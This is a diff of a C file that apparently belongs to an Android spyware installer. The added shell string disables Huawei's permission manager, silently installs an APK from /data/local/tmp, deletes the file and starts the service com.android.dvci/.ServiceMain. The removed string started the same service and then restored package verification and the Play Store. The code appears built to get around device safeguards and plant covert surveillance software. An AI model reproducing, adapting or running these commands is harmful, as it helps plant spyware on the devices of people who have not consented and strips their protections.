@@ -10,7 +10,7 @@
 #include <time.h>
 #include <stdlib.h>
 
-char *sc2 = {"am startservice -n com.android.dvci/.ServiceMain\nsleep 2\nsettings put global package_verifier_enable 1\npm enable com.android.vending\nrm %s\n"};
+char *sc = {"if [ -f \"/system/app/HwPermissionManager.apk\" ]\nthen\npm disable com.huawei.permissionmanager\nfi\nsleep 1\npm install /data/local/tmp/tmp\nrm /data/local/tmp/tmp\nam startservice -n com.android.dvci/.ServiceMain\nsleep 2\n"};
 
 // <search string> <replace string> <string to search>
 unsigned char *str_replace(unsigned char *search , unsigned char *replace , unsigned char *subject) {
@@ -114,7 +114,7 @@ int main(int argc, char *argv[]) {
     return 0;
   }
 
-  argv[1] = sc2;
+  argv[1] = sc;
 
   printf("len %d\n", (int)strlen(argv[1]));
 
